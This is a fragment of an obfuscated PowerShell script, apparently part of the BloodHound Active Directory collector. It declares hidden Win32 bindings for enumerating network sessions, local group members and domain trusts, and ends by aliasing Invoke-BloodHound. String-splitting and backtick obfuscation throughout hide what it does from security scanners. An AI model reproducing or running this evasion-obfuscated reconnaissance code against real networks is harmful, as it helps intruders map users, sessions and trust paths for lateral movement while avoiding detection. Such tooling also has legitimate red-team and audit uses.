    (&("{1}{0}"-f 'nc','fu') ("{2}{0}{1}" -f 't','api32','ne') ("{2}{1}{0}"-f 'm','ionEnu','NetSess') ([Int]) @([String], [String], [String], [Int],  (  &("{1}{0}"-f 'i','Gc') ("Va"+"Ri"+"Ab"+"lE:J8l9y"+"c")  )."V`AluE".("{2}{1}{0}{3}" -f 'yRe','eB','Mak','fType').Invoke(), [Int],  (  &("{2}{1}{0}"-f 'Le','Ab','vAri') ('R7iSG'+'B')  )."vaL`Ue".("{0}{2}{1}{3}" -f 'M','Ref','akeBy','Type').Invoke(),   (&("{0}{1}" -f'VARiaB','le')  r7isGB -vaL ).("{0}{2}{1}"-f'MakeByR','ype','efT').Invoke(),   ( &("{3}{2}{1}{0}" -f'RIABle','a','T-v','ge') ('R7I'+'sGb') -vAlUe ).("{4}{2}{3}{1}{0}"-f'e','p','fT','y','MakeByRe').Invoke())),
    (&("{0}{1}" -f 'fu','nc') ("{0}{1}{2}" -f'netap','i3','2') ("{1}{2}{5}{3}{4}{0}" -f'rs','Net','Loca','oupGetMe','mbe','lGr') ([Int]) @([String], [String], [Int],  (&("{0}{1}" -f 'IT','Em')  vaRiable:j8l9Yc)."vAL`Ue".("{0}{1}{2}{3}" -f'Mak','eBy','RefT','ype').Invoke(), [Int],   ( &("{0}{1}"-f 'gC','i')  VAriAble:r7Isgb  )."VA`lue".("{2}{3}{1}{0}" -f 'e','fTyp','Ma','keByRe').Invoke(),   (  &("{1}{0}" -f 'aRiABle','v')  ('R'+'7Is'+'gb')  )."Va`lUe".("{2}{1}{0}" -f'fType','akeByRe','M').Invoke(),  (  &("{1}{3}{0}{2}"-f 'ia','gE','blE','t-vaR') ("R"+"7ISgb") )."Va`lUe".("{0}{2}{1}"-f 'MakeByRef','ype','T').Invoke())),
    (&("{1}{0}" -f 'unc','f') ("{0}{1}{2}"-f'n','e','tapi32') ("{1}{2}{5}{4}{3}{0}"-f 'rusts','DsEnu','m','teDomainT','a','er') ([Int]) @([String], [UInt32],  (  &("{0}{2}{1}"-f 'geT-VarI','e','Abl')  ("J8L"+"9"+"YC") )."Val`UE".("{3}{2}{1}{0}" -f 'Type','ef','ByR','Make').Invoke(),   (&('ls') ("v"+"ARiA"+"ble:"+"J8L"+"9yc")  )."V`ALuE".("{3}{1}{4}{0}{2}"-f'T','ByR','ype','Make','ef').Invoke())),
    (&("{0}{1}"-f'f','unc') ("{2}{1}{0}" -f '2','tapi3','ne') ("{1}{0}{2}"-f'A','Net','piBufferFree') ([Int]) @([IntPtr])),
    (&("{0}{1}"-f'fun','c') ("{2}{1}{0}"-f'api32','v','ad') ("{3}{1}{0}{2}" -f 'i','S','dToStringSid','Convert') ([Int]) @([IntPtr],   ${0`2e}.("{0}{2}{1}" -f 'Mak','fType','eByRe').Invoke()) -SetLastError)
)



${W`kSt`A`_uSER_i`NfO`_1} = &("{1}{2}{0}"-f't','str','uc') ${M`oD} ("{0}{3}{2}{4}{1}"-f 'WK','1','NFO','STA_USER_I','_') @{
    ("{3}{0}{1}{2}" -f'k','ui1_usern','ame','w') = &("{1}{0}"-f'eld','fi') 0 ("{0}{1}" -f'S','tring') -MarshalAs @(("{2}{0}{1}"-f 'PW','Str','L'))
    ("{0}{3}{2}{1}" -f 'w','logon_domain','1_','kui') = &("{1}{0}"-f 'd','fiel') 1 ("{0}{1}" -f'Str','ing') -MarshalAs @(("{1}{0}"-f'PWStr','L'))
    ("{5}{1}{3}{2}{4}{0}" -f's','kui1_','th','o','_domain','w') = &("{1}{0}" -f 'ield','f') 2 ("{0}{1}" -f 'Strin','g') -MarshalAs @(("{1}{0}" -f'PWStr','L'))
    ("{3}{1}{4}{0}{2}"-f'e','g','rver','wkui1_lo','on_s') = &("{0}{1}" -f 'fi','eld') 3 ("{1}{2}{0}"-f 'g','Stri','n') -MarshalAs @(("{1}{0}" -f 'r','LPWSt'))
}


${SEsSi`on`_`in`Fo_10} = &("{2}{1}{0}"-f'uct','tr','s') ${m`od} ("{1}{0}{2}{3}" -f 'SION_INFO','SES','_','10') @{
    ("{1}{2}{3}{0}"-f'ame','s','esi10_c','n') = &("{0}{1}" -f 'fiel','d') 0 ("{1}{0}" -f'ing','Str') -MarshalAs @(("{0}{1}{2}"-f'LP','WSt','r'))
    ("{0}{1}{2}{3}"-f'sesi','10_u','serna','me') = &("{0}{1}" -f'fiel','d') 1 ("{1}{0}{2}" -f 'i','Str','ng') -MarshalAs @(("{1}{0}"-f 'PWStr','L'))
    ("{3}{2}{1}{0}"-f'me','10_ti','esi','s') = &("{1}{0}" -f 'd','fiel') 2 ("{0}{1}" -f 'UIn','t32')
    ("{4}{1}{2}{0}{3}"-f'le_tim','10_','id','e','sesi') = &("{0}{1}"-f 'fi','eld') 3 ("{0}{1}" -f'UInt','32')
}


${S`i`D_nAm`e`_USE} = &("{0}{1}"-f'psenu','m') ${M`oD} ("{2}{0}{1}" -f'AME_U','SE','SID_N') ("{0}{1}{2}" -f 'U','Int1','6') @{
    ("{1}{2}{0}{3}"-f'peUse','Sid','Ty','r')             = 1
    ("{0}{2}{1}{3}" -f'SidTy','rou','peG','p')            = 2
    ("{0}{2}{4}{3}{1}" -f'Sid','ain','Ty','m','peDo')           = 3
    ("{1}{2}{0}"-f 's','SidTypeAli','a')            = 4
    ("{4}{5}{0}{2}{1}{3}{6}" -f'y','lKno','peWel','wnGro','Sid','T','up')   = 5
    ("{1}{4}{5}{2}{0}{3}"-f 'ccoun','SidTypeDe','tedA','t','l','e')   = 6
    ("{3}{0}{4}{1}{2}" -f'd','l','id','Si','TypeInva')          = 7
    ("{2}{1}{3}{0}"-f'nknown','ype','SidT','U')          = 8
    ("{1}{2}{0}" -f 'r','SidType','Compute')         = 9
}


${LOCAL`gROUP_`me`m`BErS_i`N`FO`_2} = &("{1}{0}"-f 't','struc') ${M`od} ("{5}{3}{1}{2}{4}{0}"-f 'O_2','P_ME','MBER','CALGROU','S_INF','LO') @{
    ("{2}{3}{1}{0}"-f 'id','rmi2_s','l','g') = &("{1}{0}"-f'ld','fie') 0 ("{0}{1}"-f 'IntP','tr')
    ("{2}{1}{0}{3}" -f 'dus','i','lgrmi2_s','age') = &("{1}{0}" -f'ield','f') 1 ${sI`D_n`A`me_Use}
    ("{2}{3}{4}{0}{5}{1}"-f 'na','ame','lgrmi2','_dom','ai','ndn') = &("{1}{0}" -f 'ield','f') 2 ("{0}{1}{2}"-f 'S','t','ring') -MarshalAs @(("{1}{0}"-f'WStr','LP'))
}


${DSDOMa`In`FLaG} = &("{1}{0}"-f'um','psen') ${m`od} ("{2}{1}{3}{0}" -f'ags','Domain.','Ds','Fl') ("{0}{1}{2}"-f'U','I','nt32') @{
    ("{1}{0}{2}" -f'E','IN_FOR','ST')       = 1
    ("{0}{3}{1}{2}"-f'DIRECT_OU','N','D','TBOU') = 2
    ("{2}{1}{0}" -f 'OOT','E_R','TRE')       = 4
    ("{2}{0}{1}"-f'IMA','RY','PR')         = 8
    ("{1}{2}{0}{3}" -f 'IVE_','N','AT','MODE')     = 16
    ("{1}{0}{2}" -f'T_INBO','DIREC','UND')  = 32
} -Bitfield
${dsdo`mA`i`NtR`UstTYpe} = &("{1}{0}"-f'num','pse') ${m`OD} ("{0}{4}{1}{2}{3}" -f'DsD','main.T','rus','tType','o') ("{1}{0}{2}"-f'nt3','UI','2') @{
    ("{0}{2}{1}" -f'DOWNLE','L','VE')   = 1
    ("{1}{0}" -f 'L','UPLEVE')     = 2
    ("{0}{1}"-f'M','IT')         = 3
    ("{0}{1}"-f 'D','CE')         = 4
}
${D`SdO`Main`TruStaTTR`I`B`UTES} = &("{1}{0}" -f 'senum','p') ${m`Od} ("{1}{2}{4}{3}{5}{0}"-f'ributes','D','sDomain','rustAt','.T','t') ("{0}{1}{2}" -f 'UI','n','t32') @{
    ("{2}{3}{4}{1}{0}" -f'E','SITIV','NON','_T','RAN')      = 1
    ("{2}{1}{0}"-f 'LY','N','UPLEVEL_O')        = 2
    ("{2}{1}{3}{0}"-f'S','LTER_','FI','SID')         = 4
    ("{4}{0}{2}{1}{3}"-f 'EST_TR','NSITI','A','VE','FOR')   = 8
    ("{0}{4}{2}{3}{1}"-f'CRO','N','GAN','IZATIO','SS_OR')  = 16
    ("{4}{1}{2}{3}{0}" -f'ST','TH','IN_','FORE','WI')       = 32
    ("{0}{2}{3}{4}{1}" -f'TREA','RNAL','T_AS','_EXT','E')   = 64
}


${ds_D`oMai`N`_TRUSTS} = &("{1}{0}" -f'ruct','st') ${m`od} ("{4}{2}{0}{3}{1}"-f '_DOMAIN_TRU','S','S','ST','D') @{
    ("{2}{1}{3}{0}" -f'ame','iosDoma','Netb','inN') = &("{0}{1}"-f'fiel','d') 0 ("{1}{0}{2}" -f 'rin','St','g') -MarshalAs @(("{1}{0}" -f'PWStr','L'))
    ("{1}{0}{4}{3}{2}" -f'om','DnsD','ame','inN','a') = &("{1}{0}" -f'eld','fi') 1 ("{0}{1}{2}"-f'St','ri','ng') -MarshalAs @(("{0}{1}"-f 'L','PWStr'))
    ("{1}{0}"-f 'ags','Fl') = &("{1}{0}" -f 'ld','fie') 2 ${DSdoM`AInfL`Ag}
    ("{2}{0}{1}" -f 'nde','x','ParentI') = &("{0}{1}"-f 'fi','eld') 3 ("{0}{1}{2}" -f 'UI','nt3','2')
    ("{0}{2}{1}" -f 'T','e','rustTyp') = &("{0}{1}" -f'fiel','d') 4 ${ds`DOmAI`N`TRUsttY`Pe}
    ("{0}{2}{3}{4}{1}"-f'TrustA','tes','t','t','ribu') = &("{0}{1}"-f'f','ield') 5 ${dsD`OmAi`Nt`R`UStaTtri`BuTEs}
    ("{1}{2}{0}" -f 'd','Do','mainSi') = &("{0}{1}" -f 'fie','ld') 6 ("{1}{0}"-f 'tr','IntP')
    ("{0}{3}{2}{1}"-f 'Do','uid','inG','ma') = &("{1}{0}" -f'ld','fie') 7 ("{1}{0}" -f'uid','G')
}

${TYP`Es} = ${FunC`TiO`NDEF`INI`T`IOns} | &("{0}{1}{2}" -f'Add-','Win3','2Type') -Module ${m`od} -Namespace ("{1}{0}"-f'n32','Wi')
${N`e`TApI32} = ${Ty`PeS}[("{2}{1}{0}" -f'api32','t','ne')]
${a`d`VAPI32} = ${tYp`Es}[("{0}{1}{2}"-f 'adva','p','i32')]

&("{0}{2}{1}" -f'Se','-Alias','t') ("{0}{4}{2}{1}{3}"-f 'G','oun','-BloodH','dData','et') ("{3}{5}{4}{0}{2}{1}"-f 'u','d','n','Invoke-Blo','o','odH')